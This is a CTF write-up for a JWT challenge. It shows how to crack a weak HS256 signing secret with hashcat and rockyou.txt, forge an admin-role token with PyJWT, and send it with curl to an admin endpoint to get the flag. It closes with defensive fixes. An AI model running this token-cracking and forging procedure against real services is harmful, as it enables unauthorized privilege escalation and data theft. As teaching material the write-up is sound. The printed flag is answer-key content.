---
id: "friendly-ctf-forged-papers"
title: "Forged Papers"
category: "CTF Writeups"
date: "2026-09-27"
summary: "The JWT is signed correctly with HS256 but the secret is a rockyou.txt word, so you crack it offline, mint a token that says role admin, and re-sign it."
flag: "Securinets{forged_papers_grant_admin}"
tags:
  - "Mobile Security"
  - "Web Security"
---

Sign in and the server hands you a token. From then on the app just carries that token around and the server trusts whoever presents it. The screen tells you the interesting part straight away: the token is a JWT, it is not encrypted, it is Base64, and it states in plain text who you are and what you are allowed to do. You are signed in as an ordinary user. The task is to come back as someone with more authority.

There is an admin report the app can request. Ask for it with your normal token and the server says no — your role is `user`. So you need a token that says `admin`. The question is whether you can just edit the one you have.

## What you're looking at

A JWT is three Base64 chunks joined by dots: a header, a payload, and a signature. The header and payload are only encoded, not encrypted, so anyone can read them. Paste your token into [jwt.io](https://jwt.io) and the payload is right there:

```json
{
  "sub": "6",
  "username": "player",
  "role": "user",
  "iat": 1694412320,
  "exp": 1694498720
}
```

There is `"role": "user"`. The signature at the end is the part that is supposed to stop you changing that.

You need the challenge backend running (see `Writeups/Securinets-Friendly-CTF-2026/HOSTING.md`), a way to send HTTP requests (`curl` or Burp Repeater), `hashcat` or `john`, and a copy of `rockyou.txt`.

## Finding the way in

The naive move is to Base64-decode the payload, flip `user` to `admin`, re-encode, and send it. Try it. The server returns `401 Unauthorized`. It verifies the signature before it reads a single claim, and your edited payload no longer matches the signature that was computed for the original.

An HS256 signature is `HMAC-SHA256(secret, header.payload)`. To produce a valid signature for a payload you changed, you need the secret. That is the whole game: not editing the token, but learning the key that lets you sign a new one.

Here is the weakness. HS256 secrets are just strings, and if a developer picks a weak one, you can crack it offline. You do not need the server for this — the token already contains everything the signature was computed over, so you can throw a wordlist at it on your own machine and check each guess yourself. `rockyou.txt` is the first wordlist anyone reaches for, and a lot of "temporary" dev secrets are in it.

## The solve

Save your token to a file and let `hashcat` loose on it. Mode `16500` is JWT:

```bash
echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI2Ii...' > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

```
eyJ0eXAiOiJKV1Qi...:changeme
```

The secret is `changeme`. Now mint your own token with the same secret and `role` set to `admin`. A few lines of Python with PyJWT does it:

```python
import jwt
payload = {"sub": "6", "username": "player", "role": "admin"}
print(jwt.encode(payload, "changeme", algorithm="HS256"))
```

Send that token to the admin endpoint:

```bash
curl -H "Authorization: Bearer <your-forged-token>" \
     https://20.199.16.42:28443/admin/report -k
```

```json
{
  "report": "Full user export — 47 records",
  "flag": "Securinets{forged_papers_grant_admin}"
}
```

The flag is `Securinets{forged_papers_grant_admin}`. You can do the whole thing in Burp Repeater too — jwt.io will even re-sign the token for you once you type the secret into its "verify signature" box, and you paste the result into the request.

Source for this one is in `Writeups/Securinets-Friendly-CTF-2026/mobile/app`.

## Why it works

This is the authentication-and-authorization corner of the mobile top ten (M3), and it is a clean illustration of a subtle point: a verified signature is only as strong as the secret behind it. The server did everything by the book. It used a real algorithm, it checked the signature, it refused tampered tokens. None of that mattered because the key was a dictionary word. Cryptography does not fail loudly here — it works perfectly, on a secret that was never secret.

The other half is trusting a claim inside the token. The token says `role: admin` and the server believes it, because the signature vouches for it. That is a fine design right up until the signing key leaks or cracks, at which point the attacker gets to write any claim they like. The fixes are boring and they are the whole job: use a long random secret that is not in any wordlist, keep it out of source control, and rotate it if it ever escapes. `changeme` is the kind of placeholder that gets committed on day one and shipped to production on day ninety.

## Notes from building it

I sat on the algorithm choice for a while. The lazy version of this challenge decodes the JWT without checking the signature at all, so forging admin is a free Base64 edit — and it teaches nothing except "JWTs are Base64", which you would learn in thirty seconds anyway. Verifying the signature properly and putting the whole difficulty into a crackable secret is what makes this a real exercise: the work is offline, on your machine, against a wordlist, and it rewards you for understanding what the signature actually protects. The secret had to be a genuine `rockyou.txt` entry or the intended path silently breaks, so `changeme` was checked to be in there before it shipped.

## Beyond the challenge

Imagine an API that trusts an admin role inside a signed JWT, but its HMAC signing secret is a guessable word. Recovering that secret lets an attacker create a token the verifier accepts. Editing a payload alone would not do this; the valid forged signature is what crosses the boundary.

Check the signing configuration as well as the claims. Keep a high-entropy signing key on the server, and validate the expected algorithm, issuer, audience and expiry. The weak key in this challenge is deliberate, not evidence that JWT itself is broken. The [JWT learning path](https://portswigger.net/web-security/jwt) separates these failure modes.

## Keep learning

- [Hextree](https://www.hextree.io/courses): continue with Android security courses and hands-on exercises.
- [PortSwigger JWT learning path](https://portswigger.net/web-security/jwt): practice signature verification failures and weak signing keys.
